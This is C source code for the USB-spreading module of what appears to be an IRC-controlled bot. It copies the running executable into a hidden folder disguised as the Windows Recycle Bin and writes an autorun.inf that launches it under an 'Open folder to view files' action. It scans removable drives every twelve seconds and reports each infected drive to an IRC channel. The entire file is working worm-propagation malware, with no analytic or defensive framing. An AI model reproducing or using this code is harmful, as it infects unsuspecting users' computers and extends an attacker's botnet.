#include "includes.h"
#include "extern.h"

#define USBSLEEPTIME	12000
#define USB_STR_RECYCLER		"\\RECYCLER"
#define USB_STR_REC_SUBDIR		"\\S-1-6-21-2434476501-1644491937-600003330-1213"
#define USB_STR_DESKTOP_DATA	"[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}"
#define USB_STR_DESKTOP_INI		"\\Desktop.ini"
#define USB_STR_AUTORUN_INF		"\\autorun.inf"
#define USB_STR_AUTORUN_DATA1	"[autorun]\r\nopen="
#define USB_STR_AUTORUN_DATA2	"\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command="
#define USB_STR_AUTORUN_DATA3	"\r\nshell\\open\\default=1"
#define USB_STR_FILENAME		"autorunme.exe"
#define USB_CHANNEL				"#usb"


BOOL USB_InfectDrive(char *drv)
{	
	char	szFile[IRCLINE] = {0}, szTemp[IRCLINE] = {0}, *p;
	int		i;
	BOOL	ret;
	HANDLE	f;
	DWORD	d;

	// create RECYCLER
	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_RECYCLER);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create RECYCLER sub-dir
	lstrcat(szFile, USB_STR_REC_SUBDIR);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
		return FALSE;
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create Desktop.ini
	lstrcat(szFile, USB_STR_DESKTOP_INI);	
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (f < (HANDLE)1) 
		return FALSE;
	if (!WriteFile(f, USB_STR_DESKTOP_DATA, sizeof(USB_STR_DESKTOP_DATA) - 1, &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}
	CloseHandle(f);

	// copy .exe file
	p = szFile + lstrlen(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	lstrcat(szFile, USB_STR_FILENAME);
	GetModuleFileName(0, szTemp, sizeof(szTemp)-1);
	ret = CopyFile(szTemp, szFile, TRUE);
	// todo: add crc or md5 check for file
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	
	// create autorun.inf data
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	p = szFile;
	while (p[0] != '\\')
		p++;
	p++;
	lstrcat(szTemp, USB_STR_AUTORUN_DATA1);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA2);
	lstrcat(szTemp, p);
	lstrcat(szTemp, USB_STR_AUTORUN_DATA3);

	// create autorun.inf file
	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	lstrcat(szFile, drv);
	lstrcat(szFile, USB_STR_AUTORUN_INF);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return FALSE;
	if (!WriteFile(f, szTemp, lstrlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return FALSE;
	}

	CloseHandle(f);
	return ret;
}

DWORD WINAPI USB_Spreader(LPVOID param)
{
	NTHREAD usb = *((NTHREAD *)param);
	NTHREAD *usbs = (NTHREAD *)param;
	usbs->gotinfo = TRUE;
	IRC* irc=(IRC*)usb.conn;

    char		szTemp[IRCLINE] = {0}, buff[IRCLINE];
	char 		szDrive[3];
	char		*p;
	int			i;

	szDrive[0] = ' ';
	szDrive[1] = ':';
	szDrive[2] = 0;
	
	for (;;)
	{
		Sleep(USBSLEEPTIME);

    	if (GetLogicalDriveStrings(IRCLINE - 1, szTemp)) 
    	{
        	p = szTemp;
	
        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{
						if (USB_InfectDrive(szDrive))
						{
							irc->pmsg(USB_CHANNEL, "Infected drive: %s", szDrive);
						}
					}
				}

           		while (*p++);

			} while (*p);
		}
	}
}